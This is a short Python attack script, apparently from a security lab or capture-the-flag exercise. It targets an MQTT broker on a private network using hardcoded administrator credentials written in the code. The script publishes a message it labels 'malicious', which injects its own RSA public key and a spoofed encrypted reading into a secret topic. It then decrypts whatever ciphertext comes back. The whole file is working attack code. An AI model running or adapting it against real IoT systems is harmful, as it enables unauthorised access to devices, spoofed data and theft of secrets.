import paho.mqtt.client as mqtt
import time
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP


brokerAddress = "10.157.150.7"
brokerPort = 1883
topic = "Topics/topsecret/secret_value"


def enc_temp(tmp, n_b, e_b):
    temp_hex = f"{tmp}".encode()
    rsa_key = RSA.construct((n_b, e_b))
    c = PKCS1_OAEP.new(rsa_key)
    encrypted_message = c.encrypt(temp_hex)
    return encrypted_message.hex()


def create_new_rsa_key():
    return RSA.generate(2048)


def connect():
    c = mqtt.Client()
    c.on_connect = lambda client, userdata, flags, rc: (
        print(f"Connected to MQTT Broker! Publishing to '{topic}'!" if rc == 0 else f"Failed to connect, RC {rc}"))
    c.username_pw_set(username="sub_admin", password="Passw0rdADMIN99")
    c.connect(brokerAddress, brokerPort)
    return c


def get_broker_n_e():
    while True:
        try:
            n_str = input("Enter the brokers n:")
            n_int = int(n_str)
            e_str = input("Enter the brokers e:")
            e_int = int(e_str)
            print("Registered brokers n & e:")
            print(f"n: {n_int}")
            print(f"e: {e_int}")
            return n_int, e_int
        except ValueError:
            print("Non-Integer Value provided! Try again!")


def run(t, m, c, cli):
    while True:
        cli.publish(topic=t, payload=m, qos=0, retain=False)
        print("Malicious packet sent!")
        hex_ciphertext = input("Provide cipher:")
        try:
            ciphertext_bytes = bytes.fromhex(hex_ciphertext)
            decrypted_bytes = c.decrypt(ciphertext_bytes)
            print("Decrypted Ciphertext:")
            print(decrypted_bytes.decode())
            if input("Enter 'Exit' to exit, or any other key to continue:") == "Exit":
                return
        except Exception as e:
            print(e)
            pass
        time.sleep(3)


cl = connect()
n_broker, e_broker = get_broker_n_e()
temp = enc_temp(200, n_broker, e_broker)

key = create_new_rsa_key()
my_e, my_n = key.e, key.n
cipher = PKCS1_OAEP.new(key)
message = f"e:{my_e}:n:{my_n}:cipher:{temp}".encode()

run(topic, message, cipher, cl)
